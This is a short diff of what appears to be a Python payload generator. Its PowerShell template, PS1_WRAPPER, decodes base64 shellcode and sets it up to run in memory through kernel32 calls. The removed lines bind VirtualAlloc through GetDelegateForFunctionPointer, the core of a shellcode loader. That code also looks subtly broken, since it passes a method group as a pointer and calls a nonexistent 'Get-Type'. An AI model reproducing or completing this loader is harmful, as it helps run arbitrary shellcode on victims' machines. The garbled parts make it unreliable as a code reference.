@@ -403,16 +403,6 @@ PS1_WRAPPER = """\
 
 $sc = [Convert]::FromBase64String('{b64}')
 
-$size = $sc.Length
-
-$va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Add-Type -MemberDefinition '
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr VirtualAlloc(IntPtr lpAddr, uint dwSize, uint flAllocationType, uint flProtect);
-    ' -Name "WinAPI_VA" -PassThru)::VirtualAlloc,
-    (Get-Type ([System.Action]))
-)
-
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
